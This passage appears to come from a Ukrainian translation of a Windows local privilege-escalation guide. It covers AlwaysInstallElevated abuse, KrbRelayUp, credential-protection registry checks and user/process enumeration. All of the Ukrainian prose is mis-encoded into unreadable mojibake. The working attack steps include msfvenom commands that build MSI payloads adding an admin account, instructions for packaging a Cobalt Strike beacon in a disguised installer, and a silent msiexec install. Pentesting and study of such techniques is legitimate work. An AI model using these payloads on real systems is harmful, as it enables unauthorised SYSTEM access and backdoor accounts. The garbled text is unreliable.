–Ü—Å–Ω—É—î **–≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤** –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö Windows **–¥–æ–º–µ–Ω—É** –∑–∞ –ø–µ–≤–Ω–∏—Ö —É–º–æ–≤. –¶—ñ —É–º–æ–≤–∏ –≤–∫–ª—é—á–∞—é—Ç—å —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞, –¥–µ **–ø—ñ–¥–ø–∏—Å—É–≤–∞–Ω–Ω—è LDAP –Ω–µ –≤–∏–º–∞–≥–∞—î—Ç—å—Å—è,** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –º–∞—é—Ç—å –≤–ª–∞—Å–Ω—ñ –ø—Ä–∞–≤–∞, —â–æ –¥–æ–∑–≤–æ–ª—è—é—Ç—å —ó–º –Ω–∞–ª–∞—à—Ç–æ–≤—É–≤–∞—Ç–∏ **–æ–±–º–µ–∂–µ–Ω–Ω—è –¥–µ–ª–µ–≥—É–≤–∞–Ω–Ω—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ —Ä–µ—Å—É—Ä—Å—ñ–≤ (RBCD),** —Ç–∞ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –∫–æ–º–ø'—é—Ç–µ—Ä–∏ –≤ –º–µ–∂–∞—Ö –¥–æ–º–µ–Ω—É. –í–∞–∂–ª–∏–≤–æ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ —Ü—ñ **–≤–∏–º–æ–≥–∏** –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏—Ö –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å**.

–ó–Ω–∞–π–¥—ñ—Ç—å **–µ–∫—Å–ø–ª–æ–π—Ç** –≤ [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ö—ñ–¥ –∞—Ç–∞–∫–∏ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**–Ø–∫—â–æ** —Ü—ñ 2 —Ä–µ—î—Å—Ç—Ä–∏ **—É–≤—ñ–º–∫–Ω–µ–Ω—ñ** (–∑–Ω–∞—á–µ–Ω–Ω—è **0x1**), —Ç–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –±—É–¥—å-—è–∫–æ–≥–æ —Ä—ñ–≤–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –º–æ–∂—É—Ç—å **–≤—Å—Ç–∞–Ω–æ–≤–ª—é–≤–∞—Ç–∏** (–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏) —Ñ–∞–π–ª–∏ `*.msi` —è–∫ NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### –ü–µ–π–ª–æ–∞–¥–∏ Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
–Ø–∫—â–æ —É –≤–∞—Å —î —Å–µ—Å—ñ—è meterpreter, –≤–∏ –º–æ–∂–µ—Ç–µ –∞–≤—Ç–æ–º–∞—Ç–∏–∑—É–≤–∞—Ç–∏ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –º–æ–¥—É–ª—å **`exploit/windows/local/always_install_elevated`**

### PowerUP

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É `Write-UserAddMSI` –∑ power-up, —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ —É –ø–æ—Ç–æ—á–Ω–æ–º—É –∫–∞—Ç–∞–ª–æ–∑—ñ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª Windows MSI –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤. –¶–µ–π —Å–∫—Ä–∏–ø—Ç –∑–∞–ø–∏—Å—É—î –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏–π —ñ–Ω—Å—Ç–∞–ª—è—Ç–æ—Ä MSI, —è–∫–∏–π –∑–∞–ø–∏—Ç—É—î –ø—Ä–æ –¥–æ–¥–∞–≤–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞/–≥—Ä—É–ø–∏ (—Ç–æ–º—É –≤–∞–º –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è –¥–æ—Å—Ç—É–ø –¥–æ GIU):
```
Write-UserAddMSI
```
### –í–∏–∫–æ–Ω–∞–π—Ç–µ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.

### –û–±–≥–æ—Ä—Ç–∫–∞ MSI

–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ —Ü–µ–π –ø–æ—Å—ñ–±–Ω–∏–∫, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –æ–±–≥–æ—Ä—Ç–∫—É MSI –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü–∏—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤. –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –æ–±–≥–æ—Ä–Ω—É—Ç–∏ —Ñ–∞–π–ª "**.bat**", —è–∫—â–æ –≤–∏ –ø—Ä–æ—Å—Ç–æ —Ö–æ—á–µ—Ç–µ **–≤–∏–∫–æ–Ω–∞—Ç–∏** **–∫–æ–º–∞–Ω–¥–Ω—ñ —Ä—è–¥–∫–∏**

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è MSI –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è MSI –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Visual Studio

* **–°—Ç–≤–æ—Ä—ñ—Ç—å** –∑ Cobalt Strike –∞–±–æ Metasploit **–Ω–æ–≤–∏–π Windows EXE TCP payload** –≤ `C:\privesc\beacon.exe`
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ **Visual Studio**, –≤–∏–±–µ—Ä—ñ—Ç—å **–°—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π –ø—Ä–æ–µ–∫—Ç** —Ç–∞ –≤–≤–µ–¥—ñ—Ç—å "installer" —É –ø–æ–ª–µ –ø–æ—à—É–∫—É. –í–∏–±–µ—Ä—ñ—Ç—å –ø—Ä–æ–µ–∫—Ç **–ú–∞–π—Å—Ç–µ—Ä –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è** —Ç–∞ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å **–î–∞–ª—ñ**.
* –î–∞–π—Ç–µ –ø—Ä–æ–µ–∫—Ç—É –Ω–∞–∑–≤—É, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ **AlwaysPrivesc**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ **`C:\privesc`** –¥–ª—è —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è, –≤–∏–±–µ—Ä—ñ—Ç—å **—Ä–æ–∑–º—ñ—Å—Ç–∏—Ç–∏ —Ä—ñ—à–µ–Ω–Ω—è —Ç–∞ –ø—Ä–æ–µ–∫—Ç –≤ –æ–¥–Ω—ñ–π —Ç–µ–∫–∏**, —Ç–∞ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å **–°—Ç–≤–æ—Ä–∏—Ç–∏**.
* –ü—Ä–æ–¥–æ–≤–∂—É–π—Ç–µ –Ω–∞—Ç–∏—Å–∫–∞—Ç–∏ **–î–∞–ª—ñ**, –ø–æ–∫–∏ –Ω–µ –¥—ñ–π–¥–µ—Ç–µ –¥–æ –∫—Ä–æ–∫—É 3 –∑ 4 (–≤–∏–±—ñ—Ä —Ñ–∞–π–ª—ñ–≤ –¥–ª—è –≤–∫–ª—é—á–µ–Ω–Ω—è). –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å **–î–æ–¥–∞—Ç–∏** —Ç–∞ –≤–∏–±–µ—Ä—ñ—Ç—å —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –≤–∞–º–∏ —Ñ–∞–π–ª Beacon payload. –ü–æ—Ç—ñ–º –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å **–ì–æ—Ç–æ–≤–æ**.
* –í–∏–¥—ñ–ª—ñ—Ç—å –ø—Ä–æ–µ–∫—Ç **AlwaysPrivesc** –≤ **–î–µ—Ä–µ–≤—ñ —Ä—ñ—à–µ–Ω—å** —Ç–∞ –≤ **–í–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—è—Ö** –∑–º—ñ–Ω—ñ—Ç—å **TargetPlatform** –∑ **x86** –Ω–∞ **x64**.
* –Ñ —ñ–Ω—à—ñ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ, —è–∫—ñ –º–æ–∂–Ω–∞ –∑–º—ñ–Ω–∏—Ç–∏, —Ç–∞–∫—ñ —è–∫ **Author** —Ç–∞ **Manufacturer**, —è–∫—ñ –º–æ–∂—É—Ç—å –∑—Ä–æ–±–∏—Ç–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—É –ø—Ä–æ–≥—Ä–∞–º—É –±—ñ–ª—å—à –ø—Ä–∞–≤–¥–æ–ø–æ–¥—ñ–±–Ω–æ—é.
* –ö–ª–∞—Ü–Ω—ñ—Ç—å –ø—Ä–∞–≤–æ—é –∫–Ω–æ–ø–∫–æ—é –º–∏—à—ñ –Ω–∞ –ø—Ä–æ–µ–∫—Ç—ñ —Ç–∞ –≤–∏–±–µ—Ä—ñ—Ç—å **–í–∏–¥ > –í–ª–∞—Å–Ω—ñ –¥—ñ—ó**.
* –ö–ª–∞—Ü–Ω—ñ—Ç—å –ø—Ä–∞–≤–æ—é –∫–Ω–æ–ø–∫–æ—é –º–∏—à—ñ –Ω–∞ **Install** —Ç–∞ –≤–∏–±–µ—Ä—ñ—Ç—å **–î–æ–¥–∞—Ç–∏ –≤–ª–∞—Å–Ω—É –¥—ñ—é**.
* –î–≤—ñ—á—ñ –∫–ª–∞—Ü–Ω—ñ—Ç—å –Ω–∞ **–ü–∞–ø–∫–∞ –ø—Ä–æ–≥—Ä–∞–º–∏**, –≤–∏–±–µ—Ä—ñ—Ç—å –≤–∞—à —Ñ–∞–π–ª **beacon.exe** —Ç–∞ –∫–ª–∞—Ü–Ω—ñ—Ç—å **OK**. –¶–µ –∑–∞–±–µ–∑–ø–µ—á–∏—Ç—å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø–µ–π–ª–æ–∞–¥—É beacon, —è–∫ —Ç—ñ–ª—å–∫–∏ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –≤—Å—Ç–∞–Ω–æ–≤–ª—é–≤–∞—á.
* –£ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—è—Ö **–í–ª–∞—Å–Ω–æ—ó –¥—ñ—ó** –∑–º—ñ–Ω—ñ—Ç—å **Run64Bit** –Ω–∞ **True**.
* –ù–∞—Ä–µ—à—Ç—ñ, **–∑—ñ–±–µ—Ä—ñ—Ç—å —Ü–µ**.
* –Ø–∫—â–æ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î—Ç—å—Å—è –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, –ø–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ –≤–∏ –≤—Å—Ç–∞–Ω–æ–≤–∏–ª–∏ –ø–ª–∞—Ç—Ñ–æ—Ä–º—É –Ω–∞ x64.

### –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è MSI

–î–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **–≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è** –∑–ª–æ–≤–º–∏—Å–Ω–æ–≥–æ —Ñ–∞–π–ª—É `.msi` –≤ **—Ñ–æ–Ω–æ–≤–æ–º—É —Ä–µ–∂–∏–º—ñ:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
–î–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏: _exploit/windows/local/always\_install\_elevated_

## –ê–Ω—Ç–∏–≤—ñ—Ä—É—Å —Ç–∞ –¥–µ—Ç–µ–∫—Ç–æ—Ä–∏

### –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –∞—É–¥–∏—Ç—É

–¶—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –≤–∏–∑–Ω–∞—á–∞—é—Ç—å, —â–æ **–∑–∞–ø–∏—Å—É—î—Ç—å—Å—è —É –∂—É—Ä–Ω–∞–ª**, —Ç–æ–º—É –≤–∞–º —Å–ª—ñ–¥ –∑–≤–µ—Ä–Ω—É—Ç–∏ —É–≤–∞–≥—É
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, —Ü—ñ–∫–∞–≤–æ –∑–Ω–∞—Ç–∏, –∫—É–¥–∏ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—é—Ç—å—Å—è –∂—É—Ä–Ω–∞–ª–∏
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è **—É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –ø–∞—Ä–æ–ª—è–º–∏ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞**, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ —É–Ω—ñ–∫–∞–ª—å–Ω—ñ—Å—Ç—å, –≤–∏–ø–∞–¥–∫–æ–≤—ñ—Å—Ç—å —Ç–∞ —Ä–µ–≥—É–ª—è—Ä–Ω–µ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –∫–æ–∂–Ω–æ–≥–æ –ø–∞—Ä–æ–ª—è –Ω–∞ –∫–æ–º–ø'—é—Ç–µ—Ä–∞—Ö, –ø—Ä–∏—î–¥–Ω–∞–Ω–∏—Ö –¥–æ –¥–æ–º–µ–Ω—É. –¶—ñ –ø–∞—Ä–æ–ª—ñ –±–µ–∑–ø–µ—á–Ω–æ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ Active Directory —Ç–∞ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –¥–æ—Å—Ç—É–ø–Ω—ñ –ª–∏—à–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º, —è–∫—ñ –º–∞—é—Ç—å –¥–æ—Å—Ç–∞—Ç–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ —á–µ—Ä–µ–∑ ACL, —â–æ –¥–æ–∑–≤–æ–ª—è—î —ó–º –ø–µ—Ä–µ–≥–ª—è–¥–∞—Ç–∏ –ª–æ–∫–∞–ª—å–Ω—ñ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—Å—å–∫—ñ –ø–∞—Ä–æ–ª—ñ —É —Ä–∞–∑—ñ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

–Ø–∫—â–æ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–æ, **–ø–∞—Ä–æ–ª—ñ —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É –≤–∏–≥–ª—è–¥—ñ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ LSASS** (Local Security Authority Subsystem Service).\
[**–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ WDigest –Ω–∞ —Ü—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### –ó–∞—Ö–∏—Å—Ç LSA

–ü–æ—á–∏–Ω–∞—é—á–∏ –∑ **Windows 8.1**, Microsoft –≤–ø—Ä–æ–≤–∞–¥–∏–ª–∞ –ø–æ–∫—Ä–∞—â–µ–Ω–∏–π –∑–∞—Ö–∏—Å—Ç –¥–ª—è –º—ñ—Å—Ü–µ–≤–æ—ó —Å–ª—É–∂–±–∏ –±–µ–∑–ø–µ–∫–∏ (LSA), —â–æ–± **–±–ª–æ–∫—É–≤–∞—Ç–∏** —Å–ø—Ä–æ–±–∏ –Ω–µ–Ω–∞–¥—ñ–π–Ω–∏—Ö –ø—Ä–æ—Ü–µ—Å—ñ–≤ **—á–∏—Ç–∞—Ç–∏ —ó—ó –ø–∞–º'—è—Ç—å** –∞–±–æ –≤–ø—Ä–æ–≤–∞–¥–∂—É–≤–∞—Ç–∏ –∫–æ–¥, –¥–æ–¥–∞—Ç–∫–æ–≤–æ –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ —Å–∏—Å—Ç–µ–º—É.\
[**–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ –∑–∞—Ö–∏—Å—Ç LSA —Ç—É—Ç**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### –ó–∞—Ö–∏—Å—Ç –≤—ñ–¥–∂–∞–ª—é–≤–∞–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö

**–ó–∞—Ö–∏—Å—Ç –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö** –±—É–≤ –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–∏–π –≤ **Windows 10**. –ô–æ–≥–æ —Ü—ñ–ª—å - –∑–∞—Ö–∏—Å—Ç –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö, –∑–±–µ—Ä–µ–∂–µ–Ω–∏—Ö –Ω–∞ –ø—Ä–∏—Å—Ç—Ä–æ—ó, –≤—ñ–¥ –∑–∞–≥—Ä–æ–∑, —Ç–∞–∫–∏—Ö —è–∫ –∞—Ç–∞–∫–∏ —Ç–∏–ø—É pass-the-hash.| [**–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ –∑–∞—Ö–∏—Å—Ç –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö —Ç—É—Ç.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### –ö–µ—à–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ

**–û–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–æ–º–µ–Ω—É** –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—é—Ç—å—Å—è **–ú—ñ—Å—Ü–µ–≤–∏–º –æ—Ä–≥–∞–Ω–æ–º –±–µ–∑–ø–µ–∫–∏** (LSA) —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞–º–∏ –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω–æ—ó —Å–∏—Å—Ç–µ–º–∏. –ö–æ–ª–∏ –¥–∞–Ω—ñ –≤—Ö–æ–¥—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—é—Ç—å—Å—è –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–∏–º –ø–∞–∫–µ—Ç–æ–º –±–µ–∑–ø–µ–∫–∏, –∑–∞–∑–≤–∏—á–∞–π –≤—Å—Ç–∞–Ω–æ–≤–ª—é—é—Ç—å—Å—è –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–æ–º–µ–Ω—É –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.\
[**–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ –∫–µ—à–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —Ç—É—Ç**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ —Ç–∞ –ì—Ä—É–ø–∏

### –ü–µ—Ä–µ–ª—ñ–∫ –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –ì—Ä—É–ø

–í–∞–º —Å–ª—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –º–∞—é—Ç—å —è–∫—ñ-–Ω–µ–±—É–¥—å –∑ –≥—Ä—É–ø, –¥–æ —è–∫–∏—Ö –≤–∏ –Ω–∞–ª–µ–∂–∏—Ç–µ, —Ü—ñ–∫–∞–≤—ñ –¥–æ–∑–≤–æ–ª–∏
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### –ü—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –≥—Ä—É–ø–∏

–Ø–∫—â–æ –≤–∏ **–Ω–∞–ª–µ–∂–∏—Ç–µ –¥–æ –¥–µ—è–∫–æ—ó –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ—ó –≥—Ä—É–ø–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—ñ–¥–Ω—è—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó**. –î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –ø—Ä–æ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –≥—Ä—É–ø–∏ —Ç–∞ —è–∫ —ó—Ö –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —Ç—É—Ç:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### –ú–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è —Ç–æ–∫–µ–Ω–∞–º–∏

–î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ —Ç–µ, —â–æ —Ç–∞–∫–µ **—Ç–æ–∫–µ–Ω** –Ω–∞ —Ü—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ: [**Windows Tokens**](../authentication-credentials-uac-and-efs.md#access-tokens).\
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, —â–æ–± **–¥—ñ–∑–Ω–∞—Ç–∏—Å—è –ø—Ä–æ —Ü—ñ–∫–∞–≤—ñ —Ç–æ–∫–µ–Ω–∏** —Ç–∞ —è–∫ —ó—Ö –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### –ó–∞–ª–æ–≥–æ–≤–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ / –°–µ—Å—ñ—ó
```bash
qwinsta
klist sessions
```
### –î–æ–º–∞—à–Ω—ñ —Ç–µ–∫–∏
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### –ü–æ–ª—ñ—Ç–∏–∫–∞ –ø–∞—Ä–æ–ª—ñ–≤
```bash
net accounts
```
### –û—Ç—Ä–∏–º–∞—Ç–∏ –≤–º—ñ—Å—Ç –±—É—Ñ–µ—Ä–∞ –æ–±–º—ñ–Ω—É
```bash
powershell -command "Get-Clipboard"
```
## –ó–∞–ø—É—â–µ–Ω—ñ –ø—Ä–æ—Ü–µ—Å–∏

### –î–æ–∑–≤–æ–ª–∏ –Ω–∞ —Ñ–∞–π–ª–∏ —Ç–∞ —Ç–µ–∫–∏

–ü–æ-–ø–µ—Ä—à–µ, –ø–µ—Ä–µ–ª—ñ–∫ –ø—Ä–æ—Ü–µ—Å—ñ–≤ **–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –ø–∞—Ä–æ–ª—ñ–≤ —É –∫–æ–º–∞–Ω–¥–Ω–æ–º—É —Ä—è–¥–∫—É –ø—Ä–æ—Ü–µ—Å—É**.\
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –¥–µ—è–∫–∏–π –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª** –∞–±–æ —á–∏ –º–∞—î—Ç–µ –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å —É —Ç–µ–∫—É –≤–∏–∫–æ–Ω—É–≤–∞–Ω–æ–≥–æ —Ñ–∞–π–ª—É –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –º–æ–∂–ª–∏–≤–∏—Ö [**–∞—Ç–∞–∫ DLL Hijacking**](dll-hijacking.md):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
